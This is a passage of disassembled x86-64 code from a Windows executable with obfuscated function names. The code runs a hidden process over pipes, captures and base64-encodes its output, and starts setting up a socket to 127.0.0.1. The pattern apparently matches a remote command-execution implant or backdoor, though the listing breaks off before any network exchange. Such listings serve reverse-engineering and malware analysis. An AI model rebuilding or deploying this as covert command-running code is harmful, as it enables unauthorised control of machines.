   14000176c:	0f 11 84 24 d4 00 00 	movups %xmm0,0xd4(%rsp)
   140001773:	00 
   140001774:	0f 11 84 24 e4 00 00 	movups %xmm0,0xe4(%rsp)
   14000177b:	00 
   14000177c:	0f 11 84 24 f4 00 00 	movups %xmm0,0xf4(%rsp)
   140001783:	00 
   140001784:	0f 11 84 24 10 01 00 	movups %xmm0,0x110(%rsp)
   14000178b:	00 
   14000178c:	0f 11 8c 24 20 01 00 	movups %xmm1,0x120(%rsp)
   140001793:	00 
   140001794:	0f 11 84 24 b0 00 00 	movups %xmm0,0xb0(%rsp)
   14000179b:	00 
   14000179c:	c7 84 24 d0 00 00 00 	movl   $0x68,0xd0(%rsp)
   1400017a3:	68 00 00 00 
   1400017a7:	c7 84 24 0c 01 00 00 	movl   $0x100,0x10c(%rsp)
   1400017ae:	00 01 00 00 
   1400017b2:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   1400017b9:	00 00 00 00 00 
   1400017be:	e8 8d fc ff ff       	call   140001450 <snprintf>
   1400017c3:	4c 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%r10
   1400017ca:	00 
   1400017cb:	31 c9                	xor    %ecx,%ecx
   1400017cd:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   1400017d4:	00 
   1400017d5:	4c 89 54 24 48       	mov    %r10,0x48(%rsp)
   1400017da:	45 31 c9             	xor    %r9d,%r9d
   1400017dd:	45 31 c0             	xor    %r8d,%r8d
   1400017e0:	48 89 ea             	mov    %rbp,%rdx
   1400017e3:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
   1400017e8:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400017ef:	00 00 
   1400017f1:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400017f8:	00 00 
   1400017fa:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   140001801:	08 
   140001802:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140001809:	00 
   14000180a:	ff 15 e0 ea 00 00    	call   *0xeae0(%rip)        # 1400102f0 <__imp_CreateProcessA>
   140001810:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140001815:	85 c0                	test   %eax,%eax
   140001817:	0f 84 26 02 00 00    	je     140001a43 <g5_2_2lthb4+0x5a3>
   14000181d:	4c 8b 35 bc ea 00 00 	mov    0xeabc(%rip),%r14        # 1400102e0 <__IAT_start__>
   140001824:	45 31 ff             	xor    %r15d,%r15d
   140001827:	4c 8d 64 24 68       	lea    0x68(%rsp),%r12
   14000182c:	48 8d b4 24 40 04 00 	lea    0x440(%rsp),%rsi
   140001833:	00 
   140001834:	41 ff d6             	call   *%r14
   140001837:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   14000183e:	00 
   14000183f:	41 ff d6             	call   *%r14
   140001842:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
   140001849:	00 
   14000184a:	41 ff d6             	call   *%r14
   14000184d:	4c 89 e9             	mov    %r13,%rcx
   140001850:	e8 ab 7b 00 00       	call   140009400 <strlen>
   140001855:	4c 89 ea             	mov    %r13,%rdx
   140001858:	4c 8d 4c 24 64       	lea    0x64(%rsp),%r9
   14000185d:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140001862:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001869:	00 00 
   14000186b:	41 89 c0             	mov    %eax,%r8d
   14000186e:	ff 15 14 eb 00 00    	call   *0xeb14(%rip)        # 140010388 <__imp_WriteFile>
   140001874:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140001879:	41 ff d6             	call   *%r14
   14000187c:	4c 89 e9             	mov    %r13,%rcx
   14000187f:	4c 8d 6f ff          	lea    -0x1(%rdi),%r13
   140001883:	e8 30 7b 00 00       	call   1400093b8 <free>
   140001888:	8d 47 ff             	lea    -0x1(%rdi),%eax
   14000188b:	48 8b 2d ae ea 00 00 	mov    0xeaae(%rip),%rbp        # 140010340 <__imp_ReadFile>
   140001892:	89 44 24 5c          	mov    %eax,0x5c(%rsp)
   140001896:	eb 3d                	jmp    1400018d5 <g5_2_2lthb4+0x435>
   140001898:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000189f:	00 
   1400018a0:	44 8b 44 24 68       	mov    0x68(%rsp),%r8d
   1400018a5:	45 85 c0             	test   %r8d,%r8d
   1400018a8:	74 4e                	je     1400018f8 <g5_2_2lthb4+0x458>
   1400018aa:	4b 8d 3c 38          	lea    (%r8,%r15,1),%rdi
   1400018ae:	4c 39 ef             	cmp    %r13,%rdi
   1400018b1:	72 13                	jb     1400018c6 <g5_2_2lthb4+0x426>
   1400018b3:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
   1400018b8:	45 29 f8             	sub    %r15d,%r8d
   1400018bb:	44 89 44 24 68       	mov    %r8d,0x68(%rsp)
   1400018c0:	74 36                	je     1400018f8 <g5_2_2lthb4+0x458>
   1400018c2:	4b 8d 3c 07          	lea    (%r15,%r8,1),%rdi
   1400018c6:	4a 8d 0c 3b          	lea    (%rbx,%r15,1),%rcx
   1400018ca:	48 89 f2             	mov    %rsi,%rdx
   1400018cd:	49 89 ff             	mov    %rdi,%r15
   1400018d0:	e8 03 7b 00 00       	call   1400093d8 <memcpy>
   1400018d5:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400018dc:	00 00 
   1400018de:	4d 89 e1             	mov    %r12,%r9
   1400018e1:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   1400018e7:	48 89 f2             	mov    %rsi,%rdx
   1400018ea:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   1400018f1:	00 
   1400018f2:	ff d5                	call   *%rbp
   1400018f4:	85 c0                	test   %eax,%eax
   1400018f6:	75 a8                	jne    1400018a0 <g5_2_2lthb4+0x400>
   1400018f8:	42 c6 04 3b 00       	movb   $0x0,(%rbx,%r15,1)
   1400018fd:	4d 85 ff             	test   %r15,%r15
   140001900:	0f 84 da 00 00 00    	je     1400019e0 <g5_2_2lthb4+0x540>
   140001906:	4c 89 fa             	mov    %r15,%rdx
   140001909:	49 8d 4f ff          	lea    -0x1(%r15),%rcx
   14000190d:	49 b8 00 24 00 00 01 	movabs $0x100002400,%r8
   140001914:	00 00 00 
   140001917:	83 e2 03             	and    $0x3,%edx
   14000191a:	74 6a                	je     140001986 <g5_2_2lthb4+0x4e6>
   14000191c:	48 83 fa 01          	cmp    $0x1,%rdx
   140001920:	74 45                	je     140001967 <g5_2_2lthb4+0x4c7>
   140001922:	48 83 fa 02          	cmp    $0x2,%rdx
   140001926:	74 20                	je     140001948 <g5_2_2lthb4+0x4a8>
   140001928:	44 0f b6 0c 0b       	movzbl (%rbx,%rcx,1),%r9d
   14000192d:	49 89 cf             	mov    %rcx,%r15
   140001930:	41 80 f9 20          	cmp    $0x20,%r9b
   140001934:	0f 87 a6 00 00 00    	ja     1400019e0 <g5_2_2lthb4+0x540>
   14000193a:	4d 0f a3 c8          	bt     %r9,%r8
   14000193e:	0f 83 9c 00 00 00    	jae    1400019e0 <g5_2_2lthb4+0x540>
   140001944:	c6 04 0b 00          	movb   $0x0,(%rbx,%rcx,1)
   140001948:	46 0f b6 54 3b ff    	movzbl -0x1(%rbx,%r15,1),%r10d
   14000194e:	49 83 ef 01          	sub    $0x1,%r15
   140001952:	41 80 fa 20          	cmp    $0x20,%r10b
   140001956:	0f 87 84 00 00 00    	ja     1400019e0 <g5_2_2lthb4+0x540>
   14000195c:	4d 0f a3 d0          	bt     %r10,%r8
   140001960:	73 7e                	jae    1400019e0 <g5_2_2lthb4+0x540>
   140001962:	42 c6 04 3b 00       	movb   $0x0,(%rbx,%r15,1)
   140001967:	49 83 ef 01          	sub    $0x1,%r15
   14000196b:	42 0f b6 2c 3b       	movzbl (%rbx,%r15,1),%ebp
   140001970:	40 80 fd 20          	cmp    $0x20,%bpl
   140001974:	77 6a                	ja     1400019e0 <g5_2_2lthb4+0x540>
   140001976:	49 0f a3 e8          	bt     %rbp,%r8
   14000197a:	73 64                	jae    1400019e0 <g5_2_2lthb4+0x540>
   14000197c:	42 c6 04 3b 00       	movb   $0x0,(%rbx,%r15,1)
   140001981:	4d 85 ff             	test   %r15,%r15
   140001984:	74 5a                	je     1400019e0 <g5_2_2lthb4+0x540>
   140001986:	46 0f b6 5c 3b ff    	movzbl -0x1(%rbx,%r15,1),%r11d
   14000198c:	41 80 fb 20          	cmp    $0x20,%r11b
   140001990:	77 4e                	ja     1400019e0 <g5_2_2lthb4+0x540>
   140001992:	4d 0f a3 d8          	bt     %r11,%r8
   140001996:	73 48                	jae    1400019e0 <g5_2_2lthb4+0x540>
   140001998:	46 0f b6 64 3b fe    	movzbl -0x2(%rbx,%r15,1),%r12d
   14000199e:	42 c6 44 3b ff 00    	movb   $0x0,-0x1(%rbx,%r15,1)
   1400019a4:	41 80 fc 20          	cmp    $0x20,%r12b
   1400019a8:	77 36                	ja     1400019e0 <g5_2_2lthb4+0x540>
   1400019aa:	4d 0f a3 e0          	bt     %r12,%r8
   1400019ae:	73 30                	jae    1400019e0 <g5_2_2lthb4+0x540>
   1400019b0:	42 0f b6 74 3b fd    	movzbl -0x3(%rbx,%r15,1),%esi
   1400019b6:	42 c6 44 3b fe 00    	movb   $0x0,-0x2(%rbx,%r15,1)
   1400019bc:	40 80 fe 20          	cmp    $0x20,%sil
   1400019c0:	77 1e                	ja     1400019e0 <g5_2_2lthb4+0x540>
   1400019c2:	49 0f a3 f0          	bt     %rsi,%r8
   1400019c6:	73 18                	jae    1400019e0 <g5_2_2lthb4+0x540>
   1400019c8:	42 c6 44 3b fd 00    	movb   $0x0,-0x3(%rbx,%r15,1)
   1400019ce:	49 83 ef 04          	sub    $0x4,%r15
   1400019d2:	42 0f b6 2c 3b       	movzbl (%rbx,%r15,1),%ebp
   1400019d7:	40 80 fd 20          	cmp    $0x20,%bpl
   1400019db:	76 99                	jbe    140001976 <g5_2_2lthb4+0x4d6>
   1400019dd:	0f 1f 00             	nopl   (%rax)
   1400019e0:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   1400019e7:	00 
   1400019e8:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400019ed:	ff 15 85 e9 00 00    	call   *0xe985(%rip)        # 140010378 <__imp_WaitForSingleObject>
   1400019f3:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   1400019f8:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   1400019ff:	00 
   140001a00:	ff 15 02 e9 00 00    	call   *0xe902(%rip)        # 140010308 <__imp_GetExitCodeProcess>
   140001a06:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140001a0d:	00 
   140001a0e:	41 ff d6             	call   *%r14
   140001a11:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
   140001a18:	00 
   140001a19:	41 ff d6             	call   *%r14
   140001a1c:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   140001a20:	48 81 c4 48 14 00 00 	add    $0x1448,%rsp
   140001a27:	5b                   	pop    %rbx
   140001a28:	5e                   	pop    %rsi
   140001a29:	5f                   	pop    %rdi
   140001a2a:	5d                   	pop    %rbp
   140001a2b:	41 5c                	pop    %r12
   140001a2d:	41 5d                	pop    %r13
   140001a2f:	41 5e                	pop    %r14
   140001a31:	41 5f                	pop    %r15
   140001a33:	c3                   	ret
   140001a34:	4c 89 e9             	mov    %r13,%rcx
   140001a37:	e8 7c 79 00 00       	call   1400093b8 <free>
   140001a3c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001a41:	eb dd                	jmp    140001a20 <g5_2_2lthb4+0x580>
   140001a43:	48 8b 1d 96 e8 00 00 	mov    0xe896(%rip),%rbx        # 1400102e0 <__IAT_start__>
   140001a4a:	ff d3                	call   *%rbx
   140001a4c:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140001a51:	ff d3                	call   *%rbx
   140001a53:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140001a5a:	00 
   140001a5b:	ff d3                	call   *%rbx
   140001a5d:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   140001a64:	00 
   140001a65:	ff d3                	call   *%rbx
   140001a67:	4c 89 e9             	mov    %r13,%rcx
   140001a6a:	e8 49 79 00 00       	call   1400093b8 <free>
   140001a6f:	eb cb                	jmp    140001a3c <g5_2_2lthb4+0x59c>
   140001a71:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001a78:	00 00 00 00 
   140001a7c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140001a80 <g6_2_2lthb4>:
   140001a80:	49 89 d0             	mov    %rdx,%r8
   140001a83:	48 89 ca             	mov    %rcx,%rdx
   140001a86:	48 8d 0d c3 96 00 00 	lea    0x96c3(%rip),%rcx        # 14000b150 <.rdata+0x150>
   140001a8d:	e9 0e fa ff ff       	jmp    1400014a0 <g5_2_2lthb4>
   140001a92:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001a99:	00 00 00 00 
   140001a9d:	0f 1f 00             	nopl   (%rax)

0000000140001aa0 <g7_2_2lthb4>:
   140001aa0:	55                   	push   %rbp
   140001aa1:	57                   	push   %rdi
   140001aa2:	56                   	push   %rsi
   140001aa3:	53                   	push   %rbx
   140001aa4:	48 83 ec 28          	sub    $0x28,%rsp
   140001aa8:	48 bf ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rdi
   140001aaf:	aa aa aa 
   140001ab2:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140001ab6:	48 89 d6             	mov    %rdx,%rsi
   140001ab9:	48 89 cb             	mov    %rcx,%rbx
   140001abc:	48 f7 e7             	mul    %rdi
   140001abf:	48 d1 ea             	shr    $1,%rdx
   140001ac2:	48 8d 0c 95 01 00 00 	lea    0x1(,%rdx,4),%rcx
   140001ac9:	00 
   140001aca:	e8 01 79 00 00       	call   1400093d0 <malloc>
   140001acf:	49 89 c2             	mov    %rax,%r10
   140001ad2:	48 85 c0             	test   %rax,%rax
   140001ad5:	0f 84 22 02 00 00    	je     140001cfd <g7_2_2lthb4+0x25d>
   140001adb:	48 83 fe 02          	cmp    $0x2,%rsi
   140001adf:	0f 86 3b 02 00 00    	jbe    140001d20 <g7_2_2lthb4+0x280>
   140001ae5:	4c 8d 5e fd          	lea    -0x3(%rsi),%r11
   140001ae9:	45 31 c9             	xor    %r9d,%r9d
   140001aec:	45 31 c0             	xor    %r8d,%r8d
   140001aef:	4c 89 d8             	mov    %r11,%rax
   140001af2:	48 8d 0d 07 97 00 00 	lea    0x9707(%rip),%rcx        # 14000b200 <base64_chars>
   140001af9:	48 f7 e7             	mul    %rdi
   140001afc:	83 e2 02             	and    $0x2,%edx
   140001aff:	0f 85 8b 00 00 00    	jne    140001b90 <g7_2_2lthb4+0xf0>
   140001b05:	0f b6 73 01          	movzbl 0x1(%rbx),%esi
   140001b09:	0f b6 13             	movzbl (%rbx),%edx
   140001b0c:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140001b12:	0f b6 6b 02          	movzbl 0x2(%rbx),%ebp
   140001b16:	89 f7                	mov    %esi,%edi
   140001b18:	41 89 d0             	mov    %edx,%r8d
   140001b1b:	c1 e2 04             	shl    $0x4,%edx
   140001b1e:	8d 34 b5 00 00 00 00 	lea    0x0(,%rsi,4),%esi
   140001b25:	40 c0 ef 04          	shr    $0x4,%dil
   140001b29:	83 e2 30             	and    $0x30,%edx
   140001b2c:	83 e6 3c             	and    $0x3c,%esi
   140001b2f:	41 c0 e8 02          	shr    $0x2,%r8b
   140001b33:	40 0f b6 c7          	movzbl %dil,%eax
   140001b37:	89 ef                	mov    %ebp,%edi
   140001b39:	83 e5 3f             	and    $0x3f,%ebp
   140001b3c:	41 83 e0 3f          	and    $0x3f,%r8d
   140001b40:	40 c0 ef 06          	shr    $0x6,%dil
   140001b44:	09 c2                	or     %eax,%edx
   140001b46:	0f b6 2c 29          	movzbl (%rcx,%rbp,1),%ebp
   140001b4a:	46 0f b6 04 01       	movzbl (%rcx,%r8,1),%r8d
   140001b4f:	40 0f b6 c7          	movzbl %dil,%eax
   140001b53:	48 63 d2             	movslq %edx,%rdx
   140001b56:	09 c6                	or     %eax,%esi
   140001b58:	c1 e5 08             	shl    $0x8,%ebp
   140001b5b:	0f b6 14 11          	movzbl (%rcx,%rdx,1),%edx
   140001b5f:	48 63 f6             	movslq %esi,%rsi
   140001b62:	0f b6 3c 31          	movzbl (%rcx,%rsi,1),%edi
   140001b66:	4c 89 de             	mov    %r11,%rsi
   140001b69:	09 fd                	or     %edi,%ebp
   140001b6b:	c1 e5 08             	shl    $0x8,%ebp
   140001b6e:	09 d5                	or     %edx,%ebp
   140001b70:	c1 e5 08             	shl    $0x8,%ebp
   140001b73:	44 09 c5             	or     %r8d,%ebp
   140001b76:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140001b7c:	43 89 6c 0a fc       	mov    %ebp,-0x4(%r10,%r9,1)
   140001b81:	49 83 fb 02          	cmp    $0x2,%r11
   140001b85:	0f 86 f9 00 00 00    	jbe    140001c84 <g7_2_2lthb4+0x1e4>
   140001b8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001b90:	42 0f b6 7c 03 01    	movzbl 0x1(%rbx,%r8,1),%edi
   140001b96:	42 0f b6 14 03       	movzbl (%rbx,%r8,1),%edx
   140001b9b:	42 0f b6 6c 03 02    	movzbl 0x2(%rbx,%r8,1),%ebp
   140001ba1:	89 f8                	mov    %edi,%eax
   140001ba3:	41 89 d3             	mov    %edx,%r11d
   140001ba6:	c1 e2 04             	shl    $0x4,%edx
   140001ba9:	8d 3c bd 00 00 00 00 	lea    0x0(,%rdi,4),%edi
   140001bb0:	c0 e8 04             	shr    $0x4,%al
   140001bb3:	83 e2 30             	and    $0x30,%edx
   140001bb6:	83 e7 3c             	and    $0x3c,%edi
   140001bb9:	41 c0 eb 02          	shr    $0x2,%r11b
   140001bbd:	0f b6 c0             	movzbl %al,%eax
   140001bc0:	41 83 e3 3f          	and    $0x3f,%r11d
   140001bc4:	09 c2                	or     %eax,%edx
   140001bc6:	89 e8                	mov    %ebp,%eax
   140001bc8:	83 e5 3f             	and    $0x3f,%ebp
   140001bcb:	46 0f b6 1c 19       	movzbl (%rcx,%r11,1),%r11d
   140001bd0:	c0 e8 06             	shr    $0x6,%al
   140001bd3:	0f b6 2c 29          	movzbl (%rcx,%rbp,1),%ebp
   140001bd7:	48 63 d2             	movslq %edx,%rdx
   140001bda:	0f b6 c0             	movzbl %al,%eax
   140001bdd:	0f b6 14 11          	movzbl (%rcx,%rdx,1),%edx
   140001be1:	09 c7                	or     %eax,%edi
   140001be3:	c1 e5 08             	shl    $0x8,%ebp
   140001be6:	48 63 ff             	movslq %edi,%rdi
   140001be9:	0f b6 04 39          	movzbl (%rcx,%rdi,1),%eax
   140001bed:	42 0f b6 7c 03 04    	movzbl 0x4(%rbx,%r8,1),%edi
   140001bf3:	09 c5                	or     %eax,%ebp
   140001bf5:	89 f8                	mov    %edi,%eax
   140001bf7:	8d 3c bd 00 00 00 00 	lea    0x0(,%rdi,4),%edi
   140001bfe:	c1 e5 08             	shl    $0x8,%ebp
   140001c01:	c0 e8 04             	shr    $0x4,%al
   140001c04:	83 e7 3c             	and    $0x3c,%edi
   140001c07:	09 d5                	or     %edx,%ebp
   140001c09:	42 0f b6 54 03 03    	movzbl 0x3(%rbx,%r8,1),%edx
   140001c0f:	0f b6 c0             	movzbl %al,%eax
   140001c12:	c1 e5 08             	shl    $0x8,%ebp
   140001c15:	44 09 dd             	or     %r11d,%ebp
   140001c18:	41 89 d3             	mov    %edx,%r11d
   140001c1b:	c1 e2 04             	shl    $0x4,%edx
   140001c1e:	43 89 2c 0a          	mov    %ebp,(%r10,%r9,1)
   140001c22:	83 e2 30             	and    $0x30,%edx
   140001c25:	41 c0 eb 02          	shr    $0x2,%r11b
   140001c29:	49 83 c1 08          	add    $0x8,%r9
   140001c2d:	42 0f b6 6c 03 05    	movzbl 0x5(%rbx,%r8,1),%ebp
   140001c33:	09 c2                	or     %eax,%edx
   140001c35:	41 83 e3 3f          	and    $0x3f,%r11d
   140001c39:	48 63 d2             	movslq %edx,%rdx
   140001c3c:	46 0f b6 1c 19       	movzbl (%rcx,%r11,1),%r11d
   140001c41:	89 e8                	mov    %ebp,%eax
   140001c43:	83 e5 3f             	and    $0x3f,%ebp
   140001c46:	0f b6 14 11          	movzbl (%rcx,%rdx,1),%edx
   140001c4a:	c0 e8 06             	shr    $0x6,%al
   140001c4d:	0f b6 2c 29          	movzbl (%rcx,%rbp,1),%ebp
   140001c51:	0f b6 c0             	movzbl %al,%eax
   140001c54:	09 c7                	or     %eax,%edi
   140001c56:	c1 e5 08             	shl    $0x8,%ebp
   140001c59:	48 63 ff             	movslq %edi,%rdi
   140001c5c:	0f b6 04 39          	movzbl (%rcx,%rdi,1),%eax
   140001c60:	09 c5                	or     %eax,%ebp
   140001c62:	c1 e5 08             	shl    $0x8,%ebp
   140001c65:	09 d5                	or     %edx,%ebp
   140001c67:	c1 e5 08             	shl    $0x8,%ebp
   140001c6a:	44 09 dd             	or     %r11d,%ebp
   140001c6d:	48 83 ee 06          	sub    $0x6,%rsi
   140001c71:	49 83 c0 06          	add    $0x6,%r8
   140001c75:	43 89 6c 0a fc       	mov    %ebp,-0x4(%r10,%r9,1)
   140001c7a:	48 83 fe 02          	cmp    $0x2,%rsi
   140001c7e:	0f 87 0c ff ff ff    	ja     140001b90 <g7_2_2lthb4+0xf0>
   140001c84:	4f 8d 1c 0a          	lea    (%r10,%r9,1),%r11
   140001c88:	48 85 f6             	test   %rsi,%rsi
   140001c8b:	74 6c                	je     140001cf9 <g7_2_2lthb4+0x259>
   140001c8d:	42 0f b6 04 03       	movzbl (%rbx,%r8,1),%eax
   140001c92:	48 8d 0d 67 95 00 00 	lea    0x9567(%rip),%rcx        # 14000b200 <base64_chars>
   140001c99:	89 c7                	mov    %eax,%edi
   140001c9b:	c1 e0 04             	shl    $0x4,%eax
   140001c9e:	40 c0 ef 02          	shr    $0x2,%dil
   140001ca2:	83 e0 30             	and    $0x30,%eax
   140001ca5:	83 e7 3f             	and    $0x3f,%edi
   140001ca8:	0f b6 2c 39          	movzbl (%rcx,%rdi,1),%ebp
   140001cac:	4b 8d 7c 0a 02       	lea    0x2(%r10,%r9,1),%rdi
   140001cb1:	41 88 2b             	mov    %bpl,(%r11)
   140001cb4:	4b 8d 6c 0a 01       	lea    0x1(%r10,%r9,1),%rbp
   140001cb9:	4d 8d 59 03          	lea    0x3(%r9),%r11
   140001cbd:	48 83 fe 01          	cmp    $0x1,%rsi
   140001cc1:	74 4d                	je     140001d10 <g7_2_2lthb4+0x270>
   140001cc3:	42 0f b6 5c 03 01    	movzbl 0x1(%rbx,%r8,1),%ebx
   140001cc9:	89 de                	mov    %ebx,%esi
   140001ccb:	40 c0 ee 04          	shr    $0x4,%sil
   140001ccf:	44 0f b6 c6          	movzbl %sil,%r8d
   140001cd3:	44 09 c0             	or     %r8d,%eax
   140001cd6:	48 98                	cltq
   140001cd8:	0f b6 14 01          	movzbl (%rcx,%rax,1),%edx
   140001cdc:	8d 04 9d 00 00 00 00 	lea    0x0(,%rbx,4),%eax
   140001ce3:	83 e0 3c             	and    $0x3c,%eax
   140001ce6:	88 55 00             	mov    %dl,0x0(%rbp)
   140001ce9:	0f b6 0c 01          	movzbl (%rcx,%rax,1),%ecx
   140001ced:	88 0f                	mov    %cl,(%rdi)
   140001cef:	43 c6 04 1a 3d       	movb   $0x3d,(%r10,%r11,1)
   140001cf4:	4f 8d 5c 0a 04       	lea    0x4(%r10,%r9,1),%r11
   140001cf9:	41 c6 03 00          	movb   $0x0,(%r11)
   140001cfd:	4c 89 d0             	mov    %r10,%rax
   140001d00:	48 83 c4 28          	add    $0x28,%rsp
   140001d04:	5b                   	pop    %rbx
   140001d05:	5e                   	pop    %rsi
   140001d06:	5f                   	pop    %rdi
   140001d07:	5d                   	pop    %rbp
   140001d08:	c3                   	ret
   140001d09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001d10:	0f b6 1c 01          	movzbl (%rcx,%rax,1),%ebx
   140001d14:	b9 3d 00 00 00       	mov    $0x3d,%ecx
   140001d19:	88 5d 00             	mov    %bl,0x0(%rbp)
   140001d1c:	eb cf                	jmp    140001ced <g7_2_2lthb4+0x24d>
   140001d1e:	66 90                	xchg   %ax,%ax
   140001d20:	49 89 c3             	mov    %rax,%r11
   140001d23:	45 31 c9             	xor    %r9d,%r9d
   140001d26:	45 31 c0             	xor    %r8d,%r8d
   140001d29:	e9 5a ff ff ff       	jmp    140001c88 <g7_2_2lthb4+0x1e8>
   140001d2e:	66 90                	xchg   %ax,%ax

0000000140001d30 <g8_2_2lthb4>:
   140001d30:	e9 6b f7 ff ff       	jmp    1400014a0 <g5_2_2lthb4>
   140001d35:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001d3c:	00 00 00 00 

0000000140001d40 <g9_2_2lthb4>:
   140001d40:	41 57                	push   %r15
   140001d42:	b8 e8 5d 00 00       	mov    $0x5de8,%eax
   140001d47:	41 56                	push   %r14
   140001d49:	41 55                	push   %r13
   140001d4b:	41 54                	push   %r12
   140001d4d:	55                   	push   %rbp
   140001d4e:	57                   	push   %rdi
   140001d4f:	56                   	push   %rsi
   140001d50:	53                   	push   %rbx
   140001d51:	e8 9a 1c 00 00       	call   1400039f0 <___chkstk_ms>
   140001d56:	48 29 c4             	sub    %rax,%rsp
   140001d59:	0f 11 b4 24 d0 5d 00 	movups %xmm6,0x5dd0(%rsp)
   140001d60:	00 
   140001d61:	ba 31 00 00 00       	mov    $0x31,%edx
   140001d66:	48 b9 31 32 37 2e 30 	movabs $0x2e302e302e373231,%rcx
   140001d6d:	2e 30 2e 
   140001d70:	48 89 8c 24 30 03 00 	mov    %rcx,0x330(%rsp)
   140001d77:	00 
   140001d78:	b9 02 02 00 00       	mov    $0x202,%ecx
   140001d7d:	48 89 94 24 38 03 00 	mov    %rdx,0x338(%rsp)
   140001d84:	00 
   140001d85:	48 8d 94 24 30 04 00 	lea    0x430(%rsp),%rdx
   140001d8c:	00 
   140001d8d:	48 c7 84 24 40 03 00 	movq   $0x0,0x340(%rsp)
   140001d94:	00 00 00 00 00 
   140001d99:	48 c7 84 24 48 03 00 	movq   $0x0,0x348(%rsp)
   140001da0:	00 00 00 00 00 
   140001da5:	48 c7 84 24 50 03 00 	movq   $0x0,0x350(%rsp)
   140001dac:	00 00 00 00 00 
   140001db1:	48 c7 84 24 58 03 00 	movq   $0x0,0x358(%rsp)
   140001db8:	00 00 00 00 00 
   140001dbd:	48 c7 84 24 60 03 00 	movq   $0x0,0x360(%rsp)
   140001dc4:	00 00 00 00 00 
   140001dc9:	48 c7 84 24 68 03 00 	movq   $0x0,0x368(%rsp)
   140001dd0:	00 00 00 00 00 
   140001dd5:	48 c7 84 24 70 03 00 	movq   $0x0,0x370(%rsp)
   140001ddc:	00 00 00 00 00 
   140001de1:	48 c7 84 24 78 03 00 	movq   $0x0,0x378(%rsp)
   140001de8:	00 00 00 00 00 
   140001ded:	48 c7 84 24 80 03 00 	movq   $0x0,0x380(%rsp)
   140001df4:	00 00 00 00 00 
   140001df9:	48 c7 84 24 88 03 00 	movq   $0x0,0x388(%rsp)
   140001e00:	00 00 00 00 00 
   140001e05:	48 c7 84 24 90 03 00 	movq   $0x0,0x390(%rsp)
   140001e0c:	00 00 00 00 00 
   140001e11:	48 c7 84 24 98 03 00 	movq   $0x0,0x398(%rsp)
   140001e18:	00 00 00 00 00 
   140001e1d:	48 c7 84 24 a0 03 00 	movq   $0x0,0x3a0(%rsp)
   140001e24:	00 00 00 00 00 
   140001e29:	48 c7 84 24 a8 03 00 	movq   $0x0,0x3a8(%rsp)
   140001e30:	00 00 00 00 00 
   140001e35:	48 c7 84 24 b0 03 00 	movq   $0x0,0x3b0(%rsp)
   140001e3c:	00 00 00 00 00 
   140001e41:	48 c7 84 24 b8 03 00 	movq   $0x0,0x3b8(%rsp)
   140001e48:	00 00 00 00 00 
   140001e4d:	48 c7 84 24 c0 03 00 	movq   $0x0,0x3c0(%rsp)
   140001e54:	00 00 00 00 00 
   140001e59:	48 c7 84 24 c8 03 00 	movq   $0x0,0x3c8(%rsp)
   140001e60:	00 00 00 00 00 
   140001e65:	48 c7 84 24 d0 03 00 	movq   $0x0,0x3d0(%rsp)
   140001e6c:	00 00 00 00 00 
   140001e71:	48 c7 84 24 d8 03 00 	movq   $0x0,0x3d8(%rsp)
   140001e78:	00 00 00 00 00 
   140001e7d:	48 c7 84 24 e0 03 00 	movq   $0x0,0x3e0(%rsp)
   140001e84:	00 00 00 00 00 
   140001e89:	48 c7 84 24 e8 03 00 	movq   $0x0,0x3e8(%rsp)
   140001e90:	00 00 00 00 00 
   140001e95:	48 c7 84 24 f0 03 00 	movq   $0x0,0x3f0(%rsp)
   140001e9c:	00 00 00 00 00 
   140001ea1:	48 c7 84 24 f8 03 00 	movq   $0x0,0x3f8(%rsp)
   140001ea8:	00 00 00 00 00 
   140001ead:	48 c7 84 24 00 04 00 	movq   $0x0,0x400(%rsp)
   140001eb4:	00 00 00 00 00 
   140001eb9:	48 c7 84 24 08 04 00 	movq   $0x0,0x408(%rsp)
   140001ec0:	00 00 00 00 00 
